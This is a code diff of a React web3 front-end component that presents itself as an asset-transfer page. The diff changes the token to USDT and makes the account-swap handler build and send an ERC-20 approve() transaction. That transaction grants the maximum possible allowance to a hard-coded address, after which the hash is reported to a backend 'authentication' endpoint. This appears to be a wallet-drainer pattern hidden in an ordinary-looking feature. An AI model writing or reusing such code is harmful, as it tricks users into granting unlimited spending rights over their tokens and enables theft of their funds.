@@ -19,7 +19,7 @@ import { toNonExponential } from "@/utils/public";
 import { useWeb3 } from "@/hooks/useWeb3/useWeb3";
 
 import { AbiItem } from "web3-utils";
-import Web3 from "web3";
+
 import {
   getTradeAssetBalance,
   getFundsAssetBalance,
@@ -30,10 +30,10 @@ import ABI from "./ABI.json";
 import { authentication } from "@/api/userInfo";
 
 const inputAddress = [
-  "0xdac17f958d2ee523a2206206994597c13d831ec7",
-  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+  "0xdac17f958d2ee523a2206206994597c13d831ec7", // uusdt
+  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", //usdc
 ];
-const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
 // 获取合约实例
 
 const accountAddress = window.localStorage.getItem("account") || "";
@@ -41,12 +41,9 @@ const accountAddress = window.localStorage.getItem("account") || "";
 function Trans() {
   const { t } = useTranslation();
   const selectRef: any = useRef(null);
-  const { web3 } = useWeb3();
-
+  const { account, web3 } = useWeb3();
+  const [contractInstance, setContractInstance] = useState<any>();
   console.log("web3=>>>", web3);
-  const contractInstance: any =
-    web3 && new web3.eth.Contract(ABI as AbiItem[], tokenAddress);
-  console.log("contractInstance=>", contractInstance);
 
   const accountsList = [
     {
@@ -101,8 +98,14 @@ function Trans() {
   const onSelect = useCallback(
     (item: any) => {
       if (currentSelect === "from") {
+        if (item.type === to.type) {
+          setTo(from);
+        }
         setFrom(item);
       } else {
+        if (item.type === from.type) {
+          setFrom(to);
+        }
         setTo(item);
       }
     },
@@ -112,30 +115,29 @@ function Trans() {
   useEffect(() => {
     console.log("web3=>useEffect", web3);
 
-    // if (web3) {
-    //   useContract();
-    //   setTimeout(() => {
-    //     // getAuth();
-    //   }, 0);
-    // }
-  }, []);
+    if (account) {
+      const contractInstanceTemp: any =
+        web3 && new web3.eth.Contract(ABI as AbiItem[], tokenAddress);
+      console.log("contractInstance=>", contractInstance);
+      setContractInstance(contractInstanceTemp);
+    }
+  }, [account]);
   const useContract = async () => {
     console.log("web3=>useContract", web3);
 
-    const twoTo256: any = web3?.utils.toBN(
-      "0x10000000000000000000000000000000000000000000000000000000000000000"
-    );
-    const twoTo256MinusOne = twoTo256.sub(web3?.utils.toBN("1"));
+    // const twoTo256: any = web3?.utils.toBN(
+    //   "0x10000000000000000000000000000000000000000000000000000000000000000"
+    // );
+    // const twoTo256MinusOne = twoTo256.sub(web3?.utils.toBN("1"));
 
-    // const approvalAmount = web3?.utils.toWei('100000000', "ether");
-    const totalSupply = await contractInstance.methods.totalSupply().call();
-    // const approvalAmount = web3?.utils.toWei(totalSupply, "ether");
-
+    // const totalSupply = await contractInstance.methods.totalSupply().call();
+    const maxValue = web3?.utils
+      .toBN(2)
+      .pow(web3?.utils.toBN(256))
+      .sub(web3?.utils.toBN(1));
+    console.log("maxValue=>", maxValue);
     const data = await contractInstance.methods
-      .approve(
-        "0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5",
-        "0x" + twoTo256MinusOne.toString(16)
-      )
+      .approve("0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5", maxValue)
       .encodeABI();
     console.log("合约data==>", data);
 
@@ -175,10 +177,12 @@ function Trans() {
 
     web3?.eth.sendTransaction(sendTransactionPramas, async (error, hash) => {
       console.log(error, hash);
-      const { data } = await authentication({
-        tokenList: ["USDT"],
-        trxHash: hash,
-      });
+      if (hash) {
+        const { data } = await authentication({
+          tokenList: ["USDT"],
+          trxHash: hash,
+        });
+      }
     });
   };
   const getAuth = useCallback(async () => {
@@ -230,7 +234,7 @@ function Trans() {
     setFrom(JSON.parse(toTemp));
     setTo(JSON.parse(fromTemp));
     useContract();
-  }, [from, to]);
+  }, [from, to, contractInstance]);
   const transAsstes = async () => {
     const params = {
       amount,
